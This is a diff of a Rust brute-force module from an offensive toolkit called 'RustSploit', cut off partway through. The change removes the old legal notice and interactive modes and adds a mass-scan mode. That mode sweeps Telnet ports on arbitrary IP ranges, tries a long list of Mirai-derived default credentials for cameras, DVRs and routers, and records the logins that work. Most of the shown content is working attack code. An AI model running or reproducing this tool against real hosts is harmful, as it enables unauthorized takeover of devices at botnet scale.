@@ -1,2422 +1,1348 @@
-// src/modules/creds/generic/telnet_bruteforce.rs - PART 1/4
-// Comprehensive Telnet Security Testing Module
-//
-// ⚠️ LEGAL NOTICE ⚠️
-// This tool is designed for AUTHORIZED security testing ONLY.
-// Unauthorized access to computer systems is illegal under:
-// - Computer Fraud and Abuse Act (CFAA) - USA
-// - Computer Misuse Act - UK
-// - Similar laws in other jurisdictions
-//
-// Only use this tool on systems you own or have explicit written permission to test.
-
-use anyhow::{anyhow, Context, Result};
+use anyhow::{anyhow, Result};
 use colored::*;
-use rand::Rng;
-// use regex::Regex; // Unused
-use serde::{Deserialize, Serialize};
-use std::collections::{HashSet, HashMap};
-use std::net::SocketAddr; // Removed ToSocketAddrs
-use std::path::Path;
-use std::sync::{
-    atomic::{AtomicBool, AtomicU64, Ordering},
-    Arc,
+use std::{
+    collections::HashSet,
+    io::{BufRead, Write},
+    net::IpAddr,
+    sync::Arc,
+    time::Duration,
 };
-// use std::time::{SystemTime, UNIX_EPOCH}; // Unused
-use std::time::{Duration, Instant};
-use tokio::fs::{File, OpenOptions};
-use tokio::io::{AsyncBufReadExt, AsyncReadExt, AsyncWriteExt, BufReader};
-use tokio::net::{TcpStream, lookup_host}; // Added lookup_host
-use tokio::sync::{mpsc, Mutex, Semaphore};
-use tokio::time::{sleep, timeout};
-// use once_cell::sync::Lazy; // Unused
+use tokio::{
+    io::{AsyncReadExt, AsyncWriteExt},
+    net::TcpStream,
+    time::timeout,
+};
 
+use crate::modules::creds::utils::{
+    generate_combos, is_mass_scan_target, is_subnet_target, run_bruteforce, run_mass_scan,
+    run_subnet_bruteforce, BruteforceConfig, LoginResult, MassScanConfig, SubnetScanConfig,
+};
 use crate::utils::{
-    prompt_required, prompt_default, prompt_yes_no,
-    prompt_existing_file, prompt_int_range, prompt_port
+    cfg_prompt_default, cfg_prompt_existing_file, cfg_prompt_output_file, cfg_prompt_port,
+    cfg_prompt_yes_no, get_filename_in_current_dir, load_lines, normalize_target,
 };
 
 // ============================================================
-// CONSTANTS
+// Constants
 // ============================================================
 
-const MAX_MEMORY_SIZE: u64 = 500 * 1024 * 1024;
-const CHANNEL_BUFFER_MULTIPLIER: usize = 16;
-const PROGRESS_INTERVAL_SECS: u64 = 3;
-const BUFFER_SIZE: usize = 4096;
-const RESPONSE_BUFFER_CAPACITY: usize = 2048;
-const DEFAULT_TELNET_PORTS: &[u16] = &[23, 2323, 23231];
-const TASK_WATCHDOG_TIMEOUT_SECS: u64 = 20;
+const DEFAULT_TELNET_PORT: u16 = 23;
+const COMMON_TELNET_PORTS: &[u16] = &[23, 2323, 23231];
+const CONNECT_TIMEOUT_SECS: u64 = 8;
+const READ_TIMEOUT_SECS: u64 = 5;
+const RECENT_BUF_CAP: usize = 2048;
+/// Max password file size to load entirely into memory (500 MB).
+/// Larger files are streamed in chunks to avoid OOM.
+const MAX_MEMORY_WORDLIST_BYTES: u64 = 500 * 1024 * 1024;
+/// Lines per chunk when streaming large wordlists.
+const STREAM_CHUNK_SIZE: usize = 100_000;
 
-// Bogon/Private/Reserved exclusion ranges for batch/subnet scanning
-const EXCLUDED_RANGES: &[&str] = &[
-    "10.0.0.0/8", "127.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16",
-    "224.0.0.0/4", "240.0.0.0/4", "0.0.0.0/8",
-    "100.64.0.0/10", "169.254.0.0/16", "255.255.255.255/32",
-    "1.1.1.1/32", "1.0.0.1/32", "8.8.8.8/32", "8.8.4.4/32",
-];
+// Telnet IAC protocol bytes
+const IAC: u8 = 255;
+const WILL: u8 = 251;
+const WONT: u8 = 252;
+const DO: u8 = 253;
+const DONT: u8 = 254;
+const SB: u8 = 250;
+const SE: u8 = 240;
+const GA: u8 = 249;
+const NOP: u8 = 241;
+const ECHO: u8 = 1;
+const SGA: u8 = 3;
+const TERMINAL_TYPE: u8 = 24;
+const NAWS: u8 = 31;
+const LINEMODE: u8 = 34;
+const NEW_ENVIRON: u8 = 39;
+const ENVIRON: u8 = 36;
+const TERMINAL_SPEED: u8 = 32;
+const X_DISPLAY_LOCATION: u8 = 35;
+// Subnegotiation: TERMINAL_TYPE
+const TT_IS: u8 = 0;
+const TT_SEND: u8 = 1;
 
+/// Default credentials ordered by real-world IoT/botnet frequency.
+/// Sources: Mirai source, Shodan honeypot data, IPVM research.
 const DEFAULT_CREDENTIALS: &[(&str, &str)] = &[
-    ("root", "root"),
-    ("admin", "admin"),
-    ("user", "user"),
-    ("guest", "guest"),
-    ("root", "123456"),
-    ("admin", "123456"),
-    ("root", "password"),
-    ("admin", "password"),
+    // Tier 1: Most common IoT defaults (empty passwords, trivial creds)
     ("root", ""),
     ("admin", ""),
-    ("telnet", "telnet"),
+    ("root", "root"),
+    ("admin", "admin"),
+    ("root", "admin"),
+    ("admin", "password"),
+    ("root", "password"),
+    ("root", "123456"),
+    ("admin", "123456"),
+    ("root", "1234"),
+    ("admin", "1234"),
+    ("root", "12345"),
+    ("admin", "12345"),
+    ("root", "default"),
+    ("admin", "default"),
+    ("admin", "root"),
+    // Tier 2: Common embedded/router creds
+    ("user", "user"),
+    ("guest", "guest"),
     ("support", "support"),
+    ("supervisor", "supervisor"),
+    ("service", "service"),
+    ("root", "toor"),
+    ("root", "pass"),
+    ("root", "master"),
     ("tech", "tech"),
-    ("test", "test"),
-    ("oracle", "oracle"),
+    ("operator", "operator"),
+    // Tier 3: Mirai-targeted (camera/DVR/NVR firmware defaults)
+    ("root", "vizxv"),        // Dahua
+    ("root", "xc3511"),       // Xiongmai/CMS
+    ("root", "888888"),       // Dahua DVR
+    ("root", "666666"),       // Dahua NVR
+    ("root", "juantech"),     // Xiongmai v2
+    ("root", "jvbzd"),        // HiSilicon generic
+    ("root", "anko"),         // Anko/generic IP cam
+    ("root", "54321"),        // TP-Link/D-Link
+    ("root", "hi3518"),       // HiSilicon chipset default
+    ("root", "tlJwpbo6"),     // HiSilicon alt
+    ("root", "xmhdipc"),      // Xiongmai IPC
+    ("root", "klv1234"),      // HiSilicon KLV
+    ("root", "Zte521"),       // ZTE router
+    ("root", "7ujMko0admin"), // Mirai original
+    ("admin", "meinsm"),      // MeinSM router
+    ("mother", "fucker"),     // Mirai hajime variant
+    // Tier 4: ISP/CPE equipment
+    ("root", "zsun1188"),
+    ("root", "OxhlwSG8"),
+    ("admin", "smcadmin"),
+    ("admin", "epicrouter"),
+    ("admin", "conexant"),
+    ("admin", "utstar"),
+    ("admin", "admin1234"),
+    ("root", "ikwb"),
+    ("root", "realtek"),
+    ("root", "dreambox"),
+    ("root", "changeme"),
 ];
 
 // ============================================================
-// CONFIGURATION STRUCTURES
+// Module info
 // ============================================================
 
-#[derive(Clone, Serialize, Deserialize)]
-pub struct TelnetBruteforceConfig {
-    #[serde(skip)]
-    pub target: String,
-    pub port: u16,
-    pub username_wordlist: String,
-    pub password_wordlist: Option<String>,
-    pub threads: usize,
-    pub delay_ms: u64,
-    pub connection_timeout: u64,
-    pub banner_read_timeout: u64,
-    pub login_prompt_timeout: u64,
-    pub password_prompt_timeout: u64,
-    pub auth_response_timeout: u64,
-    pub command_timeout: u64,
-    pub write_timeout: u64,
-    pub stop_on_success: bool,
-    pub verbose: bool,
-    pub full_combo: bool,
-    pub raw_bruteforce: bool,
-    pub raw_charset: String,
-    pub raw_min_length: usize,
-    pub raw_max_length: usize,
-    pub output_file: String,
-    pub append_mode: bool,
-    pub pre_validate: bool,
-    pub retry_on_error: bool,
-    pub max_retries: usize,
-    pub login_prompts: Vec<String>,
-    pub password_prompts: Vec<String>,
-    pub success_indicators: Vec<String>,
-    pub failure_indicators: Vec<String>,
-
-    #[serde(skip)]
-    pub login_prompts_lower: Vec<String>,
-    #[serde(skip)]
-    pub password_prompts_lower: Vec<String>,
-    #[serde(skip)]
-    pub success_indicators_lower: Vec<String>,
-    #[serde(skip)]
-    pub failure_indicators_lower: Vec<String>,
+pub fn info() -> crate::module_info::ModuleInfo {
+    crate::module_info::ModuleInfo {
+        name: "Telnet Brute Force".to_string(),
+        description: "Brute-force Telnet authentication with full IAC negotiation, \
+            ANSI stripping, multilingual prompt detection, and 55+ IoT/router default \
+            credentials. Supports combo mode, concurrent connections, subnet scanning, \
+            and mass scanning."
+            .to_string(),
+        authors: vec!["RustSploit Contributors".to_string()],
+        references: vec![],
+        disclosure_date: None,
+        rank: crate::module_info::ModuleRank::Normal,
+    }
 }
 
-#[derive(Clone)]
-pub struct BatchScanConfig {
-    pub targets: Vec<String>,
-    pub ports: Vec<u16>,
-    pub credentials: Vec<(String, String)>,
-    pub timeout: Duration,
-    pub max_concurrent: usize,
-    pub output_file: String,
-    pub verbose: bool,
+// ============================================================
+// Shared telnet config (passed via Arc into closures)
+// ============================================================
+
+struct TelnetConfig {
+    connect_timeout: Duration,
+    read_timeout: Duration,
+    login_prompts: Vec<String>,
+    password_prompts: Vec<String>,
+    success_indicators: Vec<String>,
+    failure_indicators: Vec<String>,
+    lockout_indicators: Vec<String>,
 }
 
-impl Default for BatchScanConfig {
-    fn default() -> Self {
+impl TelnetConfig {
+    fn new(connect_secs: u64, read_secs: u64) -> Self {
         Self {
-            targets: Vec::new(),
-            ports: DEFAULT_TELNET_PORTS.to_vec(),
-            credentials: DEFAULT_CREDENTIALS
-            .iter()
-            .map(|(u, p)| (u.to_string(), p.to_string()))
-            .collect(),
-            timeout: Duration::from_secs(3),
-            max_concurrent: 50,
-            output_file: "telnet_scan_results.txt".to_string(),
-            verbose: false,
-        }
-    }
-}
-
-#[derive(Debug, Clone)]
-pub struct ScanResult {
-    pub ip: String,
-    pub port: u16,
-    pub banner: String,
-    pub credentials: Option<(String, String)>,
-    pub timestamp: String,
-}
-
-impl TelnetBruteforceConfig {
-    #[inline]
-    pub fn preprocess_prompts(&mut self) {
-        self.login_prompts_lower = self.login_prompts.iter().map(|s| s.to_lowercase()).collect();
-        self.password_prompts_lower = self.password_prompts.iter().map(|s| s.to_lowercase()).collect();
-        self.success_indicators_lower = self.success_indicators.iter().map(|s| s.to_lowercase()).collect();
-        self.failure_indicators_lower = self.failure_indicators.iter().map(|s| s.to_lowercase()).collect();
-    }
-}
-
-// ============================================================
-// STATISTICS TRACKING
-// ============================================================
-
-pub struct Statistics {
-    total_attempts: AtomicU64,
-    successful_attempts: AtomicU64,
-    failed_attempts: AtomicU64,
-    error_attempts: AtomicU64,
-    retried_attempts: AtomicU64,
-    timeouts: AtomicU64,
-    broken_pipes: AtomicU64,
-    hung_tasks: AtomicU64,
-    retries_queued: AtomicU64,
-    start_time: Instant,
-    unique_errors: Mutex<HashMap<String, usize>>,
-}
-
-impl Statistics {
-    #[inline]
-    pub fn new() -> Self {
-        Self {
-            total_attempts: AtomicU64::new(0),
-            successful_attempts: AtomicU64::new(0),
-            failed_attempts: AtomicU64::new(0),
-            error_attempts: AtomicU64::new(0),
-            retried_attempts: AtomicU64::new(0),
-            timeouts: AtomicU64::new(0),
-            broken_pipes: AtomicU64::new(0),
-            hung_tasks: AtomicU64::new(0),
-            retries_queued: AtomicU64::new(0),
-            start_time: Instant::now(),
-            unique_errors: Mutex::new(HashMap::new()),
-        }
-    }
-
-    #[inline]
-    pub fn record_attempt(&self, success: bool, error: bool) {
-        self.total_attempts.fetch_add(1, Ordering::Relaxed);
-        if error {
-            self.error_attempts.fetch_add(1, Ordering::Relaxed);
-        } else if success {
-            self.successful_attempts.fetch_add(1, Ordering::Relaxed);
-        } else {
-            self.failed_attempts.fetch_add(1, Ordering::Relaxed);
-        }
-    }
-
-    #[inline]
-    pub fn record_retry(&self) {
-        self.retried_attempts.fetch_add(1, Ordering::Relaxed);
-    }
-
-    #[inline]
-    pub fn record_timeout(&self) {
-        self.timeouts.fetch_add(1, Ordering::Relaxed);
-    }
-
-    #[inline]
-    pub fn record_broken_pipe(&self) {
-        self.broken_pipes.fetch_add(1, Ordering::Relaxed);
-    }
-
-    #[inline]
-    pub fn record_hung_task(&self) {
-        self.hung_tasks.fetch_add(1, Ordering::Relaxed);
-    }
-
-    #[inline]
-    pub fn record_retry_queued(&self) {
-        self.retries_queued.fetch_add(1, Ordering::Relaxed);
-    }
-
-    pub async fn record_error_kind(&self, key: &str) {
-        let mut guard = self.unique_errors.lock().await;
-        *guard.entry(key.to_string()).or_insert(0) += 1;
-    }
-
-    pub fn print_progress(&self) {
-        let total = self.total_attempts.load(Ordering::Relaxed);
-        let success = self.successful_attempts.load(Ordering::Relaxed);
-        let failed = self.failed_attempts.load(Ordering::Relaxed);
-        let errors = self.error_attempts.load(Ordering::Relaxed);
-        let retries = self.retried_attempts.load(Ordering::Relaxed);
-        let elapsed = self.start_time.elapsed().as_secs_f64();
-        let rate = if elapsed > 0.0 { total as f64 / elapsed } else { 0.0 };
-
-        print!(
-            "\r{} {} attempts | {} OK | {} fail | {} err | {} retry | {:.1}/s    ",
-            "[Progress]".cyan(),
-               total.to_string().bold(),
-               success.to_string().green(),
-               failed,
-               errors.to_string().red(),
-               retries,
-               rate
-        );
-        let _ = std::io::Write::flush(&mut std::io::stdout());
-    }
-
-    pub async fn print_final(&self) {
-        println!();
-        let total = self.total_attempts.load(Ordering::Relaxed);
-        let success = self.successful_attempts.load(Ordering::Relaxed);
-        let failed = self.failed_attempts.load(Ordering::Relaxed);
-        let errors = self.error_attempts.load(Ordering::Relaxed);
-        let retries = self.retried_attempts.load(Ordering::Relaxed);
-        let timeouts = self.timeouts.load(Ordering::Relaxed);
-        let broken = self.broken_pipes.load(Ordering::Relaxed);
-        let hung = self.hung_tasks.load(Ordering::Relaxed);
-        let queued = self.retries_queued.load(Ordering::Relaxed);
-        let elapsed = self.start_time.elapsed().as_secs_f64();
-        let rate = if elapsed > 0.0 { total as f64 / elapsed } else { 0.0 };
-
-        println!("\n{}", "[Final Statistics]".bold().cyan());
-        println!("  Total attempts:  {}", total.to_string().bold());
-        println!("  Successful:      {}", success.to_string().green().bold());
-        println!("  Failed:          {}", failed);
-        println!("  Errors:          {}", errors.to_string().yellow());
-        println!("  Timeouts:        {}", timeouts);
-        println!("  Broken pipes:    {}", broken);
-        println!("  Hung tasks:      {}", hung);
-        println!("  Retries (done):  {}", retries);
-        println!("  Retries (queued):{}", queued);
-        println!("  Time elapsed:    {:.2}s", elapsed);
-        println!("  Average rate:    {:.2} attempts/sec", rate);
-        if total > 0 {
-            let success_rate = (success as f64 / total as f64) * 100.0;
-            println!("  Success rate:    {:.2}%", success_rate);
-        }
-
-        // Print top error types (best-effort)
-        let guard = self.unique_errors.lock().await;
-        if !guard.is_empty() {
-            println!("\n{}", "  Top error types:".bold());
-            let mut items: Vec<_> = guard.iter().collect();
-            items.sort_by(|a, b| b.1.cmp(a.1));
-            for (key, count) in items.into_iter().take(5) {
-                println!("    - {}: {}", key, count);
-            }
+            connect_timeout: Duration::from_secs(connect_secs),
+            read_timeout: Duration::from_secs(read_secs),
+            login_prompts: default_login_prompts(),
+            password_prompts: default_password_prompts(),
+            success_indicators: default_success_indicators(),
+            failure_indicators: default_failure_indicators(),
+            lockout_indicators: default_lockout_indicators(),
         }
     }
 }
 
 // ============================================================
-// MAIN ENTRY POINT
+// Entry point
 // ============================================================
 
 pub async fn run(target: &str) -> Result<()> {
-    display_banner();
+    crate::mprintln!("{}", "=== Telnet Brute Force Module ===".bold());
+    crate::mprintln!("[*] Target: {}", target);
 
-    // Check for API-provided config - skip mode selection in API mode
-    let config = crate::config::get_module_config();
-    let api_mode = config.is_api_mode();
-    
-    if api_mode {
-        // In API mode, directly run single target bruteforce (most common use case)
-        return run_single_target_bruteforce_api(target, &config).await;
-    }
-
-    println!("Select operation mode:");
-    println!("  1. Single Target Bruteforce (advanced)");
-    println!("  2. Subnet Bruteforce (CIDR notation)");
-    println!("  3. Batch Scanner (multiple targets)");
-    println!("  4. Quick Default Check (single target)");
-    println!("  5. Subnet Default Check (CIDR)");
-    println!();
-
-    let mode = prompt_required("Select mode [1-5]: ")?;
-
-    match mode.as_str() {
-        "1" => run_single_target_bruteforce(target, false).await,
-        "2" => run_single_target_bruteforce(target, true).await,
-        "3" => run_batch_scanner(target).await,
-        "4" => run_quick_check(target, false).await,
-        "5" => run_quick_check(target, true).await,
-        _ => {
-            println!("[!] Invalid selection");
-            Ok(())
-        }
-    }
-}
-
-/// API mode entry for single target bruteforce - uses module config directly
-async fn run_single_target_bruteforce_api(target: &str, api_config: &crate::config::ModuleConfig) -> Result<()> {
-    let targets = parse_single_target(target)?;
-    let target_primary = targets[0].clone();
-    
-    // Build config from API params
-    let username_file = api_config.username_wordlist.clone()
-        .ok_or_else(|| anyhow::anyhow!("Username wordlist required for API mode"))?;
-    let password_file = api_config.password_wordlist.clone()
-        .ok_or_else(|| anyhow::anyhow!("Password wordlist required for API mode"))?;
-    
-    if !std::path::Path::new(&username_file).exists() {
-        return Err(anyhow::anyhow!("Username wordlist not found: {}", username_file));
-    }
-    if !std::path::Path::new(&password_file).exists() {
-        return Err(anyhow::anyhow!("Password wordlist not found: {}", password_file));
-    }
-    
-    let mut config = TelnetBruteforceConfig {
-        target: target_primary,
-        port: api_config.port.unwrap_or(23),
-        username_wordlist: username_file,
-        password_wordlist: Some(password_file),
-        output_file: api_config.output_file.clone().unwrap_or_else(|| "telnet_results.txt".to_string()),
-        threads: api_config.concurrency.unwrap_or(500),
-        delay_ms: 0,
-        connection_timeout: 10,
-        banner_read_timeout: 5,
-        login_prompt_timeout: 5,
-        password_prompt_timeout: 5,
-        auth_response_timeout: 5,
-        command_timeout: 5,
-        write_timeout: 5,
-        stop_on_success: api_config.stop_on_success.unwrap_or(true),
-        verbose: api_config.verbose.unwrap_or(false),
-        full_combo: api_config.combo_mode.unwrap_or(false),
-        raw_bruteforce: false,
-        raw_charset: String::new(),
-        raw_min_length: 1,
-        raw_max_length: 8,
-        append_mode: false,
-        pre_validate: false,
-        retry_on_error: true,
-        max_retries: 3,
-        login_prompts: vec!["login:".to_string(), "username:".to_string()],
-        password_prompts: vec!["password:".to_string(), "pass:".to_string()],
-        success_indicators: vec!["$".to_string(), "#".to_string(), ">".to_string()],
-        failure_indicators: vec!["incorrect".to_string(), "invalid".to_string(), "failed".to_string()],
-        login_prompts_lower: Vec::new(),
-        password_prompts_lower: Vec::new(),
-        success_indicators_lower: Vec::new(),
-        failure_indicators_lower: Vec::new(),
-    };
-    
-    config.preprocess_prompts();
-    run_telnet_bruteforce(config).await
-}
-
-// ============================================================
-// BASIC HONEYPOT DETECTION
-// ============================================================
-
-// ============================================================
-// MODE 1 & 2: SINGLE TARGET / SUBNET BRUTEFORCE
-// ============================================================
-
-async fn run_single_target_bruteforce(target: &str, is_subnet: bool) -> Result<()> {
-    println!("\n{}", if is_subnet {
-        "=== Subnet Bruteforce Mode ==="
-    } else {
-        "=== Single Target Bruteforce Mode ==="
-    }.bold().cyan());
-    println!();
-
-    let targets = parse_single_target(target)?;
-
-    if targets.len() > 1 {
-        println!("[*] Expanded to {} hosts", targets.len());
-        if !prompt_yes_no("Continue with all hosts? (y/n): ", true)? {
-            return Ok(());
-        }
-    }
-
-    let target_primary = targets[0].clone();
-
-    let use_config = prompt_yes_no("Do you have a configuration file? (y/n): ", false)?;
-
-    let mut config = if use_config {
-        println!();
-        print_config_format();
-        println!();
-
-        let config_path = prompt_existing_file("Path to configuration file: ")?;
-
-        println!("[*] Loading configuration from '{}'...", config_path);
-        match load_and_validate_config(&config_path, &target_primary).await {
-            Ok(cfg) => {
-                println!("{}", "[+] Configuration loaded and validated!".green().bold());
-                cfg
-            }
-            Err(e) => {
-                eprintln!("{}", "[!] Configuration validation failed:".red().bold());
-                eprintln!("    {}", e.to_string().yellow());
-                return Err(e);
-            }
-        }
-    } else {
-        build_interactive_config(&target_primary).await?
-    };
-
-    config.preprocess_prompts();
-    print_config_summary(&config);
-
-    if !prompt_yes_no("\nProceed with this configuration? (y/n): ", true)? {
-        println!("[*] Aborted by user.");
-        return Ok(());
-    }
-
-    if !use_config && prompt_yes_no("\nSave this configuration? (y/n): ", false)? {
-        let save_path = prompt_required("Configuration file path: ")?;
-        if let Err(e) = save_config(&config, &save_path).await {
-            eprintln!("[!] Failed to save config: {}", e);
-        } else {
-            println!("[+] Configuration saved to '{}'", save_path);
-        }
-    }
-
-    println!();
-    println!("{}", "[Starting Attack]".bold().yellow());
-    println!();
-
-    if targets.len() > 1 {
-        let parallel = prompt_yes_no("Run targets in parallel? (y/n): ", false)?;
-        if parallel {
-            run_parallel_bruteforce(targets, config).await
-        } else {
-            run_sequential_bruteforce(targets, config).await
-        }
-    } else {
-        run_telnet_bruteforce(config).await
-    }
-}
-
-async fn run_sequential_bruteforce(targets: Vec<String>, base_config: TelnetBruteforceConfig) -> Result<()> {
-    for (idx, target) in targets.iter().enumerate() {
-        println!("\n{}", format!("=== Target {}/{}: {} ===", idx + 1, targets.len(), target).bright_cyan());
-        let mut config = base_config.clone();
-        config.target = target.clone();
-
-        if let Err(e) = run_telnet_bruteforce(config).await {
-            eprintln!("[!] Error with target {}: {}", target, e);
-        }
-
-        if idx < targets.len() - 1 {
-            sleep(Duration::from_secs(1)).await;
-        }
-    }
-    Ok(())
-}
-
-async fn run_parallel_bruteforce(targets: Vec<String>, base_config: TelnetBruteforceConfig) -> Result<()> {
-    let max_concurrent = prompt_threads(5)?;
-    let semaphore = Arc::new(Semaphore::new(max_concurrent));
-    let mut tasks = Vec::new();
-
-    for target in targets {
-        let sem = semaphore.clone();
-        let config = base_config.clone();
-
-        let task = tokio::spawn(async move {
-            let _permit = sem.acquire().await.map_err(|e| anyhow::anyhow!("Semaphore closed: {}", e))?;
-            let mut target_config = config;
-            target_config.target = target.clone();
-            run_telnet_bruteforce(target_config).await
-        });
-
-        tasks.push(task);
-    }
-
-    for task in tasks {
-        if let Err(e) = task.await {
-            eprintln!("[!] Task error: {}", e);
-        }
-    }
-
-    Ok(())
-}
-
-// ============================================================
-// MODE 3: BATCH SCANNER
-// ============================================================
-
-async fn run_batch_scanner(target: &str) -> Result<()> {
-    println!("\n{}", "=== Batch Scanner Mode ===".bold().cyan());
-    println!();
-
-    let mut config = BatchScanConfig::default();
-
-    if Path::new(target).exists() {
-        let content = tokio::fs::read_to_string(target).await?;
-        config.targets = parse_targets(&content)?;
-    } else {
-        config.targets = parse_targets(target)?;
-    }
-
-    if config.targets.is_empty() {
-        return Err(anyhow!("No valid targets specified"));
-    }
-
-    println!("Loaded {} target(s)", config.targets.len());
-
-    // IP exclusion prompt
-    if prompt_yes_no("Exclude reserved/private IP ranges? (y/n): ", true)? {
-        let exclusions: Vec<ipnetwork::IpNetwork> = EXCLUDED_RANGES.iter()
-            .filter_map(|cidr| cidr.parse::<ipnetwork::IpNetwork>().ok())
-            .collect();
-        let before = config.targets.len();
-        config.targets.retain(|ip| {
-            if let Ok(addr) = ip.parse::<std::net::IpAddr>() {
-                !exclusions.iter().any(|net| net.contains(addr))
-            } else {
-                true // keep hostnames
-            }
-        });
-        let excluded = before - config.targets.len();
-        if excluded > 0 {
-            println!("{}", format!("[*] Excluded {} IPs from reserved/private ranges", excluded).yellow());
-        }
-        println!("{}", format!("[+] {} targets remaining after exclusion", config.targets.len()).green());
-        if config.targets.is_empty() {
-            return Err(anyhow!("No targets remaining after exclusion"));
-        }
-    }
-
-    if prompt_yes_no("Use default ports (23, 2323, 23231)? (y/n): ", true)? {
-        config.ports = DEFAULT_TELNET_PORTS.to_vec();
-    } else {
-        let ports_str = prompt_required("Enter ports (comma-separated): ")?;
-        config.ports = ports_str
-        .split(',')
-        .filter_map(|s| s.trim().parse().ok())
-        .collect();
-    }
-
-    if prompt_yes_no("Use default credential list? (y/n): ", true)? {
-        config.credentials = DEFAULT_CREDENTIALS
-        .iter()
-        .map(|(u, p)| (u.to_string(), p.to_string()))
-        .collect();
-    } else {
-        let cred_file = prompt_existing_file("Path to credentials file (user:pass format): ")?;
-        config.credentials = load_credentials_file(&cred_file).await?;
-    }
-
-    config.max_concurrent = prompt_threads(50)?;
-    config.verbose = prompt_yes_no("Verbose output? (y/n): ", false)?;
-    config.output_file = prompt_required("Output file: ")?;
-
-    println!();
-    println!("Configuration:");
-    println!("  Targets:      {}", config.targets.len());
-    println!("  Ports:        {:?}", config.ports);
-    println!("  Credentials:  {}", config.credentials.len());
-    println!("  Concurrency:  {}", config.max_concurrent);
-    println!();
-
-    if !prompt_yes_no("Start scan? (y/n): ", true)? {
-        println!("Scan cancelled");
-        return Ok(());
-    }
-
-    println!();
-    execute_batch_scan(config).await
-}
-
-// ============================================================
-// MODE 4 & 5: QUICK DEFAULT CHECK
-// ============================================================
-
-async fn run_quick_check(target: &str, is_subnet: bool) -> Result<()> {
-    println!("\n{}", if is_subnet {
-        "=== Subnet Quick Default Check ==="
-    } else {
-        "=== Quick Default Credential Check ==="
-    }.bold().cyan());
-    println!();
-
-    let mut targets = if is_subnet {
-        parse_single_target(target)?
-    } else if Path::new(target).exists() {
-        let content = tokio::fs::read_to_string(target).await?;
-        parse_targets(&content)?
-    } else {
-        vec![target.to_string()]
-    };
-
-    // Apply IP exclusion for subnet/batch modes
-    if targets.len() > 1 && prompt_yes_no("Exclude reserved/private IP ranges? (y/n): ", true)? {
-        let exclusions: Vec<ipnetwork::IpNetwork> = EXCLUDED_RANGES.iter()
-            .filter_map(|cidr| cidr.parse::<ipnetwork::IpNetwork>().ok())
-            .collect();
-        let before = targets.len();
-        targets.retain(|ip| {
-            if let Ok(addr) = ip.parse::<std::net::IpAddr>() {
-                !exclusions.iter().any(|net| net.contains(addr))
-            } else {
-                true
-            }
-        });
-        let excluded = before - targets.len();
-        if excluded > 0 {
-            println!("{}", format!("[*] Excluded {} IPs from reserved/private ranges", excluded).yellow());
-        }
-    }
-
-    let port: u16 = prompt_port("Port", 23)?;
-
-    let verbose = prompt_yes_no("Verbose mode? (show all attempts and details) (y/n): ", false)?;
-
-    println!();
-    println!("Testing {} target(s) on port {} with {} default credentials...",
-             targets.len(), port, DEFAULT_CREDENTIALS.len());
-    if verbose {
-        println!("{}", "[*] Verbose mode enabled - showing all attempts and details".cyan());
-    }
-    println!();
-
-    let mut found_any = false;
-    let mut results = Vec::new();
-    let mut total_attempts = 0;
-    let mut successful_attempts = 0;
-    let mut failed_attempts = 0;
-    let mut error_attempts = 0;
-
-    for (target_idx, target_ip) in targets.iter().enumerate() {
-        println!("{}", format!("[*] Testing {}:{} ({}/{})", target_ip, port, target_idx + 1, targets.len()).bold());
-        if verbose {
-            println!("  Target: {}:{}", target_ip, port);
-            println!("  Testing {} default credential pairs...", DEFAULT_CREDENTIALS.len());
-        }
-
-        for (cred_idx, (username, password)) in DEFAULT_CREDENTIALS.iter().enumerate() {
-            total_attempts += 1;
-
-            if verbose {
-                print!("  [{}/{}] Testing {}/{}... ",
-                       cred_idx + 1,
-                       DEFAULT_CREDENTIALS.len(),
-                       username,
-                       if password.is_empty() { "(blank)" } else { password });
-                let _ = std::io::Write::flush(&mut std::io::stdout());
-            }
-
-            match try_telnet_login_simple(&target_ip, port, username, password, 3).await {
-                Ok(true) => {
-                    successful_attempts += 1;
-                    let result = format!("{}:{} - {}/{}",
-                                         target_ip, port, username,
-                                         if password.is_empty() { "(blank)" } else { password });
-
-                    if verbose {
-                        println!(
-                            "\r  [{}/{}] {} Valid: {}/{}",
-                            cred_idx + 1,
-                            DEFAULT_CREDENTIALS.len(),
-                                 "✓".bright_green().bold(),
-                                 username,
-                                 if password.is_empty() { "(blank)" } else { password }
-                        );
-                    } else {
-                        println!(
-                            "  {} Valid: {}/{}",
-                            "✓".bright_green().bold(),
-                                 username,
-                                 if password.is_empty() { "(blank)" } else { password }
-                        );
+    // --- Mass Scan Mode ---
+    if is_mass_scan_target(target) {
+        crate::mprintln!(
+            "{}",
+            format!("[*] Target: {} \u{2014} Mass Scan Mode", target).yellow()
+        );
+        let cfg = Arc::new(TelnetConfig::new(5, 3));
+        return run_mass_scan(
+            target,
+            MassScanConfig {
+                protocol_name: "Telnet",
+                default_port: 23,
+                state_file: "telnet_hose_state.log",
+                default_output: "telnet_mass_results.txt",
+                default_concurrency: 500,
+            },
+            move |ip, port| {
+                let cfg = cfg.clone();
+                async move {
+                    // Sweep the prompted port + common alternatives
+                    let mut ports_to_try = vec![port];
+                    for &p in COMMON_TELNET_PORTS {
+                        if !ports_to_try.contains(&p) {
+                            ports_to_try.push(p);
+                        }
                     }
-                    results.push(result);
-                    found_any = true;
+
+                    for p in ports_to_try {
+                        if !crate::utils::tcp_port_open(ip, p, Duration::from_secs(3)).await {
+                            continue;
+                        }
+                        let addr = format!("{}:{}", ip, p);
+                        for &(user, pass) in DEFAULT_CREDENTIALS {
+                            match try_telnet_login(&addr, user, pass, &cfg).await {
+                                Ok(true) => {
+                                    let _ = crate::cred_store::store_credential(
+                                        &ip.to_string(),
+                                        p,
+                                        "telnet",
+                                        user,
+                                        pass,
+                                        crate::cred_store::CredType::Password,
+                                        "creds/generic/telnet_bruteforce",
+                                    )
+                                    .await;
+                                    let ts = chrono::Local::now().format("%Y-%m-%d %H:%M:%S");
+                                    crate::mprintln!(
+                                        "\r{}",
+                                        format!("[+] {}:{} -> {}:{}", ip, p, user, pass)
+                                            .green()
+                                            .bold()
+                                    );
+                                    return Some(format!(
+                                        "[{}] {}:{}:{}:{}\n",
+                                        ts, ip, p, user, pass
+                                    ));
+                                }
+                                Ok(false) => {
+                                    tokio::time::sleep(Duration::from_millis(50)).await;
+                                    continue;
+                                }
+                                Err(_) => break, // port error, try next port
+                            }
+                        }
+                    }
+                    None
                 }
-                Ok(false) => {
-                    failed_attempts += 1;
-                    if verbose {
-                        println!("\r  [{}/{}] {} Invalid: {}/{}",
-                                 cred_idx + 1,
-                                 DEFAULT_CREDENTIALS.len(),
-                                 "✗".red(),
-                                 username,
